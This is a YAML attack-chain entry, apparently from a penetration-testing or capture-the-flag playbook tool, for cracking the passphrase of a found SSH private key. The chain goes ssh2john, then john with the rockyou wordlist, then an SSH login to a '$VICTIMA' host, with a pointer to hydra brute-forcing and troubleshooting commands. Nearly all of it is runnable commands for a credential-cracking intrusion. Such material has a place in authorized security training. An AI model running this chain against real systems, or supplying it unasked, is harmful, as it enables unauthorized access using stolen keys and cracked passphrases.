chain_id: idrsa_passphrase_crack
title: "Crack id_rsa passphrase with ssh2john + john"
severity: HIGH
tags: [crypto, ssh, id_rsa, ssh2john, john]

trigger:
  any_of:
    - { kind: "private-key" }

description: |
  A PEM-encoded private key (id_rsa or similar) was detected. If `head -3`
  shows `Proc-Type: 4,ENCRYPTED` or `DEK-Info`, the key is encrypted with a
  passphrase that john can crack via ssh2john.

steps:
  - id: 1
    title: "Confirm the key is encrypted"
    command: head -3 id_rsa
    notes: |
      If output includes 'Proc-Type: 4,ENCRYPTED' or 'DEK-Info', the key is
      encrypted. If only '-----BEGIN OPENSSH PRIVATE KEY-----' appears
      without further headers, it can be used directly without a passphrase.

  - id: 2
    title: "Extract the hash from the private key"
    command: ssh2john id_rsa > idrsa.hash

  - id: 3
    title: "Crack the passphrase"
    command: john --wordlist=/usr/share/wordlists/rockyou.txt idrsa.hash

  - id: 4
    title: "Show the passphrase"
    command: john --show idrsa.hash

  - id: 5
    title: "Restrict permissions on the key"
    command: chmod 600 id_rsa

  - id: 6
    title: "Connect over SSH using the key"
    command: ssh -i id_rsa USUARIO@$VICTIMA
    notes: |
      Enter the passphrase from `john --show` when prompted. If the username
      is unknown, try the passphrase as a password against a list of users
      with hydra (see chain ssh_brute_force, case B).

common_errors:
  - error: "Permission denied (publickey) on every user"
    solution: |
      The key is wrong, or OpenSSH versions disagree. Force exclusive use:
        ssh -i id_rsa -o IdentitiesOnly=yes USUARIO@$VICTIMA
      If it persists, hint the accepted key type:
        ssh -i id_rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa USUARIO@$VICTIMA

references:
  - https://www.openwall.com/john/doc/EXAMPLES.shtml
